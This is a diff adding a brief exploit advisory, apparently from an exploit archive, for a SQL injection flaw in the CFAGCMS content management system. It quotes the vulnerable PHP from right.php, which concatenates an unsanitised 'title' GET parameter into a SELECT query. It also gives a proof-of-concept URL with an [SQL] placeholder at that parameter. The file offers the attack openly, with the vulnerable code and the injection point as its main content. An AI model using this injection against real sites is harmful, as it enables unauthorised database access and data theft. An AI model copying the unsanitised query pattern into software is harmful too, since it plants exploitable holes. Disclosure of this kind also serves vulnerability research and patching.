@@ -1,0 +1,19 @@
+################################################################################
+## Exploit Title: CFAGCMS SQL Injection Exploit                               ##
+## Date: 20-12-2009                                                           ##
+## Author: cr4wl3r                                                            ##
+## Software Link: http://sourceforge.net/project/showfiles.php?group_id=197936##
+## Version: N/A                                                               ##
+## Tested on: GNU/LINUX                                                       ##
+################################################################################
+
+
+~ Code [right.php]
+
+$title  = $_GET['title'];
+$query  = "SELECT * FROM pages WHERE title = '".$title."'";
+$result = mysql_query($query);
+
+~ PoC
+
+[cfagcms_path]/right.php?title=[SQL]
